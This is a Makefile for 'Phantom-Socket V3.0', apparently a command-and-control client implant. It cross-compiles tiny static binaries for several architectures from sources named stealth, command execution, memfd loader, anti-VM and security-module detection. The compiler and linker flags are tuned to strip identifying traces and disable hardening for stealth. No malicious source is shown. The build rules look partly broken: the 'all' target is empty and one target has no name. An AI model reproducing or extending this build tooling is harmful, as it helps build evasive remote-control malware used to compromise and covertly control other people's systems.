# Phantom-Socket V3.0 - Client Agent Makefile
# Supports cross-compilation for 5 architectures with musl libc
# Target: static binary < 50KB, zero shared library dependencies

# Architecture detection
ARCH ?= $(shell uname -m)
ifeq ($(ARCH),x86_64)
    ARCH_NAME := x86_64
    CROSS_COMPILE :=
else ifeq ($(ARCH),i386)
    ARCH_NAME := i386
    CROSS_COMPILE := i686-linux-gnu-
else ifeq ($(ARCH),i686)
    ARCH_NAME := i386
    CROSS_COMPILE := i686-linux-gnu-
else ifeq ($(ARCH),aarch64)
    ARCH_NAME := aarch64
    CROSS_COMPILE := aarch64-linux-gnu-
else ifeq ($(ARCH),armv7l)
    ARCH_NAME := arm
    CROSS_COMPILE := arm-linux-gnueabi-
else ifeq ($(ARCH),armv6l)
    ARCH_NAME := arm
    CROSS_COMPILE := arm-linux-gnueabi-
else ifeq ($(ARCH),arm)
    ARCH_NAME := arm
    CROSS_COMPILE := arm-linux-gnueabi-
else
    ARCH_NAME := x86_64
    CROSS_COMPILE :=
endif

# Compiler and tools
CC := $(CROSS_COMPILE)gcc
STRIP := $(CROSS_COMPILE)strip
AR := $(CROSS_COMPILE)ar

# Check for musl-gcc availability (only for host x86_64)
ifeq ($(ARCH_NAME),x86_64)
    MUSL_GCC := $(shell which musl-gcc 2>/dev/null)
    ifneq ($(MUSL_GCC),)
        CC := musl-gcc
        STRIP := strip
        AR := ar
    endif
endif

# Directory structure
SRCDIR := src
INCDIR := include
LIBDIR := lib
ARCH_NAME ?= $(shell uname -m)
ARCHDIR := arch/$(ARCH_NAME)
BUILDDIR := build/$(ARCH_NAME)
BINDIR := bin

# Source files
SOURCES := $(wildcard $(SRCDIR)/*.c)
# OBJECTS := $(patsubst $(SRCDIR)/%.c,$(BUILDDIR)/%.o,$(SOURCES))

# C2 Client Sources
C2_SOURCES := $(SRCDIR)/main.c \
              $(SRCDIR)/utils.c \
              $(SRCDIR)/crypto_engine.c \
              $(SRCDIR)/network_core.c \
              $(SRCDIR)/stealth.c \
              $(SRCDIR)/command_execution.c \
              $(SRCDIR)/tls_wrapper.c \
              $(SRCDIR)/dns_resolver.c \
              $(SRCDIR)/memfd_loader.c \
              $(SRCDIR)/security_module_detect.c \
              $(SRCDIR)/syscall_ports.c \
              $(SRCDIR)/anti_vm.c

SENTINEL_SOURCES := $(SRCDIR)/sentinel_standalone.c

_C2_TARGET := $(BINDIR)/phantom-client-$(ARCH_NAME)
_SENTINEL_TARGET := $(BINDIR)/phantom-sentinel-$(ARCH_NAME)

# CFLAGS - Optimized for size and stealth
_CFLAGS := -Os -static -static-libgcc
_CFLAGS += -fno-ident -fno-asynchronous-unwind-tables -fno-unwind-tables
_CFLAGS += -fomit-frame-pointer
_CFLAGS += -fno-stack-protector -fmerge-all-constants -funsigned-char
_CFLAGS += -flto
_CFLAGS += -Wall -Wextra -Werror=return-type -Werror=implicit-function-declaration
_CFLAGS += -I$(INCDIR) -I$(LIBDIR)/monocypher -I$(LIBDIR)/bearssl/inc -I$(ARCHDIR)
_CFLAGS += -D_GNU_SOURCE -D_POSIX_C_SOURCE=200809L
_CFLAGS += -DNDEBUG -D_FORTIFY_SOURCE=0

# LDFLAGS
_LDFLAGS := -static -flto -Wl,--gc-sections -Wl,--strip-all -Wl,--as-needed
_LDFLAGS += -Wl,--exclude-libs,ALL -Wl,-O1 -Wl,--sort-common
_LDFLAGS += -Wl,--build-id=none -Wl,--hash-style=sysv
_LDFLAGS += -Wl,--discard-all -Wl,--discard-locals
_LDFLAGS += -Wl,-z,norelro -Wl,--no-dynamic-linker
_LDFLAGS += -static-libgcc -lpthread

# Libraries
MONOCYPHER_SRC := $(LIBDIR)/monocypher/monocypher.c
MONOCYPHER_OBJ := $(BUILDDIR)/monocypher.o

BEARSSL_SRC := $(wildcard $(LIBDIR)/bearssl/*.c)
BEARSSL_OBJ := $(patsubst $(LIBDIR)/bearssl/%.c,$(BUILDDIR)/%.o,$(BEARSSL_SRC))

.PHONY: all clean  check-env x86_64 i386 aarch64 arm

all: 

x86_64:
	$(MAKE)  ARCH=x86_64

i386:
	$(MAKE)  ARCH=i386

aarch64:
	$(MAKE)  ARCH=aarch64

arm:
	$(MAKE)  ARCH=arm

clean:
	rm -rf build bin
	rm -f lib/monocypher/*.o lib/monocypher/*.a

check-env:
	@$(CC) --version >/dev/null 2>&1 || { echo "ERROR: Compiler $(CC) not found"; exit 1; }

$(BUILDDIR):
	mkdir -p $(BUILDDIR)

$(BINDIR):
	mkdir -p $(BINDIR)

$(MONOCYPHER_OBJ): $(MONOCYPHER_SRC) | $(BUILDDIR)
	$(CC) $(_CFLAGS) -c $< -o $@

$(BUILDDIR)/%.o: $(LIBDIR)/bearssl/%.c | $(BUILDDIR)
	$(CC) $(_CFLAGS) -c $< -o $@

$(_C2_TARGET): $(C2_SOURCES) $(MONOCYPHER_OBJ) $(BEARSSL_OBJ) | $(BINDIR)
	$(CC) $(C2_SOURCES) $(MONOCYPHER_OBJ) $(BEARSSL_OBJ) -o $@ $(_CFLAGS) $(_LDFLAGS)
	$(STRIP) --strip-all $@

$(_SENTINEL_TARGET): $(SENTINEL_SOURCES) $(MONOCYPHER_OBJ) | $(BINDIR)
	$(CC) $(SENTINEL_SOURCES) $(MONOCYPHER_OBJ) -o $@ $(_CFLAGS) $(_LDFLAGS)
	$(STRIP) --strip-all $@

: check-env $(_C2_TARGET) $(_SENTINEL_TARGET)
	@echo "===  Build Complete [$(ARCH_NAME)] ==="
	@ls -lh $(_C2_TARGET) $(_SENTINEL_TARGET)
